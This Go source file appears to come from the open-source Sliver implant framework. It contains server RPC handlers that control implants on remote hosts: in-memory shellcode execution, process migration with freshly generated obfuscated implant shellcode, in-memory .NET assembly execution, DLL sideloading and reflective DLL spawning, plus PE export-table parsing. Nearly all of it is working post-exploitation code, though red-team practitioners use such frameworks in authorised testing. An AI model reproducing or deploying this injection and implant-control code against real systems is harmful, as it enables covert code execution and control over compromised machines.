package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path"
	"strings"

	"github.com/Binject/debug/pe"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/db"
	"github.com/bishopfox/sliver/server/generate"

	"google.golang.org/protobuf/proto"
)

// Task - Execute shellcode in-memory
func (rpc *Server) Task(ctx context.Context, req *sliverpb.TaskReq) (*sliverpb.Task, error) {
	resp := &sliverpb.Task{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// Migrate - Migrate to a new process on the remote system (Windows only)
func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*sliverpb.Migrate, error) {
	var shellcode []byte
	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}
	name := path.Base(req.Config.GetName())
	shellcode, err := getSliverShellcode(name)
	if err != nil {
		name, config := generate.ImplantConfigFromProtobuf(req.Config)
		if name == "" {
			name, err = generate.GetCodename()
			if err != nil {
				return nil, err
			}
		}
		config.Format = clientpb.OutputFormat_SHELLCODE
		config.ObfuscateSymbols = true
		shellcodePath, err := generate.SliverShellcode(name, config)
		if err != nil {
			return nil, err
		}
		shellcode, err = ioutil.ReadFile(shellcodePath)
	}
	reqData, err := proto.Marshal(&sliverpb.InvokeMigrateReq{
		Request: req.Request,
		Data:    shellcode,
		Pid:     req.Pid,
	})
	if err != nil {
		return nil, err
	}
	timeout := rpc.getTimeout(req)
	respData, err := session.Request(sliverpb.MsgInvokeMigrateReq, timeout, reqData)
	if err != nil {
		return nil, err
	}
	resp := &sliverpb.Migrate{}
	err = proto.Unmarshal(respData, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// ExecuteAssembly - Execute a .NET assembly on the remote system in-memory (Windows only)
func (rpc *Server) ExecuteAssembly(ctx context.Context, req *sliverpb.ExecuteAssemblyReq) (*sliverpb.ExecuteAssembly, error) {
	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}
	shellcode, err := generate.DonutFromAssembly(
		req.Assembly,
		req.IsDLL,
		req.Arch,
		req.Arguments,
		req.Method,
		req.ClassName,
		req.AppDomain,
	)
	if err != nil {
		return nil, err
	}

	reqData, err := proto.Marshal(&sliverpb.InvokeExecuteAssemblyReq{
		Data:    shellcode,
		Process: req.Process,
	})
	if err != nil {
		return nil, err
	}
	rpcLog.Infof("Sending execute assembly request to session %d\n", req.Request.SessionID)
	timeout := rpc.getTimeout(req)
	respData, err := session.Request(sliverpb.MsgInvokeExecuteAssemblyReq, timeout, reqData)
	if err != nil {
		return nil, err
	}
	resp := &sliverpb.ExecuteAssembly{}
	err = proto.Unmarshal(respData, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil

}

// Sideload - Sideload a DLL on the remote system (Windows only)
func (rpc *Server) Sideload(ctx context.Context, req *sliverpb.SideloadReq) (*sliverpb.Sideload, error) {
	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}

	var err error
	var respData []byte
	timeout := rpc.getTimeout(req)
	switch session.ToProtobuf().GetOS() {
	case "windows":
		shellcode, err := generate.DonutShellcodeFromPE(req.Data, session.Arch, false, req.Args, "", "", req.IsDLL)
		// shellcode, err := generate.ShellcodeRDIFromBytes(req.Data, req.EntryPoint, req.Args)
		if err != nil {
			return nil, err
		}
		data, err := proto.Marshal(&sliverpb.SideloadReq{
			Request:     req.Request,
			Data:        shellcode,
			ProcessName: req.ProcessName,
			Kill:        req.Kill,
		})
		if err != nil {
			return nil, err
		}
		respData, err = session.Request(sliverpb.MsgSideloadReq, timeout, data)
	case "darwin":
		fallthrough
	case "linux":
		reqData, err := proto.Marshal(req)
		if err != nil {
			return nil, err
		}
		respData, err = session.Request(sliverpb.MsgSideloadReq, timeout, reqData)
	default:
		err = fmt.Errorf("%s does not support sideloading", session.ToProtobuf().GetOS())
	}
	if err != nil {
		return nil, err
	}

	resp := &sliverpb.Sideload{}
	err = proto.Unmarshal(respData, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// SpawnDll - Spawn a DLL on the remote system (Windows only)
func (rpc *Server) SpawnDll(ctx context.Context, req *sliverpb.InvokeSpawnDllReq) (*sliverpb.SpawnDll, error) {
	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}

	resp := &sliverpb.SpawnDll{}
	offset, err := getExportOffsetFromMemory(req.Data, req.EntryPoint)
	if err != nil {
		return nil, err
	}
	timeout := rpc.getTimeout(req)
	data, err := proto.Marshal(&sliverpb.SpawnDllReq{
		Data:        req.Data,
		Offset:      offset,
		ProcessName: req.ProcessName,
		Args:        req.Args,
		Request:     req.Request,
		Kill:        req.Kill,
	})
	if err != nil {
		return nil, err
	}
	respData, err := session.Request(sliverpb.MsgSpawnDllReq, timeout, data)
	err = proto.Unmarshal(respData, resp)
	return resp, err
}

// Utility functions
func getSliverShellcode(name string) ([]byte, error) {
	var data []byte
	build, err := db.ImplantBuildByName(name)
	if err != nil {
		return nil, err
	}

	switch build.ImplantConfig.Format {
	case clientpb.OutputFormat_SHELLCODE:
		fileData, err := generate.ImplantFileFromBuild(build)
		if err != nil {
			return data, err
		}
		data = fileData
	case clientpb.OutputFormat_EXECUTABLE:
		// retrieve EXE from db
		fileData, err := generate.ImplantFileFromBuild(build)
		rpcLog.Debugf("Found implant. Len: %d\n", len(fileData))
		if err != nil {
			return data, err
		}
		data, err = generate.DonutShellcodeFromPE(fileData, build.ImplantConfig.GOARCH, false, "", "", "", false)
		if err != nil {
			rpcLog.Errorf("DonutShellcodeFromPE error: %v\n", err)
			return data, err
		}
	case clientpb.OutputFormat_SHARED_LIB:
		// retrieve DLL from db
		fileData, err := generate.ImplantFileFromBuild(build)
		if err != nil {
			return data, err
		}
		data, err = generate.ShellcodeRDIFromBytes(fileData, "RunSliver", "")
		if err != nil {
			return data, err
		}
	case clientpb.OutputFormat_SERVICE:
		fallthrough
	default:
		err = fmt.Errorf("no existing shellcode found")
	}
	return data, err
}

// ExportDirectory - stores the Export data
type ExportDirectory struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32 // RVA from base of image
	AddressOfNames        uint32 // RVA from base of image
	AddressOfNameOrdinals uint32 // RVA from base of image
}

func rvaToFoa(rva uint32, pefile *pe.File) uint32 {
	var offset uint32
	for _, section := range pefile.Sections {
		if rva >= section.SectionHeader.VirtualAddress && rva <= section.SectionHeader.VirtualAddress+section.SectionHeader.Size {
			offset = section.SectionHeader.Offset + (rva - section.SectionHeader.VirtualAddress)
		}
	}
	return offset
}

func getFuncName(index uint32, rawData []byte, fpe *pe.File) string {
	nameRva := binary.LittleEndian.Uint32(rawData[index:])
	nameFOA := rvaToFoa(nameRva, fpe)
	funcNameBytes, err := bytes.NewBuffer(rawData[nameFOA:]).ReadBytes(0)
	if err != nil {
		log.Fatal(err)
		return ""
	}
	funcName := string(funcNameBytes[:len(funcNameBytes)-1])
	return funcName
}

func getOrdinal(index uint32, rawData []byte, fpe *pe.File, funcArrayFoa uint32) uint32 {
	ordRva := binary.LittleEndian.Uint16(rawData[index:])
	funcArrayIndex := funcArrayFoa + uint32(ordRva)*8
	funcRVA := binary.LittleEndian.Uint32(rawData[funcArrayIndex:])
	funcOffset := rvaToFoa(funcRVA, fpe)
	return funcOffset
}

func getExportOffsetFromFile(filepath string, exportName string) (funcOffset uint32, err error) {
	rawData, err := ioutil.ReadFile(filepath)
	if err != nil {
		return 0, err
	}
	handle, err := os.Open(filepath)
	if err != nil {
		return 0, err
	}
	defer handle.Close()
	fpe, _ := pe.NewFile(handle)
	exportDirectoryRVA := fpe.OptionalHeader.(*pe.OptionalHeader64).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
	var offset = rvaToFoa(exportDirectoryRVA, fpe)
	exportDir := ExportDirectory{}
	buff := &bytes.Buffer{}
	buff.Write(rawData[offset:])
	err = binary.Read(buff, binary.LittleEndian, &exportDir)
	if err != nil {
		return 0, err
	}
	current := exportDir.AddressOfNames
	nameArrayFOA := rvaToFoa(exportDir.AddressOfNames, fpe)
	ordinalArrayFOA := rvaToFoa(exportDir.AddressOfNameOrdinals, fpe)
	funcArrayFoa := rvaToFoa(exportDir.AddressOfFunctions, fpe)

	for i := uint32(0); i < exportDir.NumberOfNames; i++ {
		index := nameArrayFOA + i*8
		name := getFuncName(index, rawData, fpe)
		if strings.Contains(name, exportName) {
			ordIndex := ordinalArrayFOA + i*2
			funcOffset = getOrdinal(ordIndex, rawData, fpe, funcArrayFoa)
		}
		current += uint32(binary.Size(i))
	}

	return
}

func getExportOffsetFromMemory(rawData []byte, exportName string) (funcOffset uint32, err error) {
	peReader := bytes.NewReader(rawData)
	fpe, err := pe.NewFile(peReader)
	if err != nil {
		return 0, err
	}

	exportDirectoryRVA := fpe.OptionalHeader.(*pe.OptionalHeader64).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
	var offset = rvaToFoa(exportDirectoryRVA, fpe)
	exportDir := ExportDirectory{}
	buff := &bytes.Buffer{}
	buff.Write(rawData[offset:])
	err = binary.Read(buff, binary.LittleEndian, &exportDir)
	if err != nil {
		return 0, err
	}
	current := exportDir.AddressOfNames
	nameArrayFOA := rvaToFoa(exportDir.AddressOfNames, fpe)
	ordinalArrayFOA := rvaToFoa(exportDir.AddressOfNameOrdinals, fpe)
	funcArrayFoa := rvaToFoa(exportDir.AddressOfFunctions, fpe)

	for i := uint32(0); i < exportDir.NumberOfNames; i++ {
		index := nameArrayFOA + i*8
		name := getFuncName(index, rawData, fpe)
		if strings.Contains(name, exportName) {
			ordIndex := ordinalArrayFOA + i*2
			funcOffset = getOrdinal(ordIndex, rawData, fpe, funcArrayFoa)
		}
		current += uint32(binary.Size(i))
	}

	return
}
